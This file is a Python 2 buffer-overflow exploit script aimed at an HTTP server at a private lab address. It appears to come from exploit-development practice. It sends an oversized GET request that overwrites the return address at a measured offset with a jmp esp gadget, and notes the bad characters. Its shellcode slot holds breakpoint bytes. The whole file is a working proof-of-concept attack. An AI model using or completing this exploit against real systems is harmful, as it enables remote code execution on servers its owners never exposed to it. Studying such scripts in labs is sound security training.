#!/usr/bin/env python2

import socket
import struct

RHOST = "10.10.10.2"
RPORT = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# appears to break at 5000

# offsets
# EIP 1786
# ESP 1790
# EBX 1782

# pointers
# jmp_esp in ntldll.dll at 76dfe871
jmp_esp = 0x76dfe871

eip_offset = 1786
buf_len = 5000

# badchars = [0x00, 0x0A, 0x0D]

padding = "A" * eip_offset
eip = struct.pack("<I", jmp_esp)
shellcode = "\xCC\xCC\xCC\xCC"
esp_content = "C" * (buf_len - len(padding) - len(eip) - len(shellcode))

buf = padding + eip + shellcode + esp_content
s.send("GET /" + buf + " HTTP/1.1\r\n\r\n")

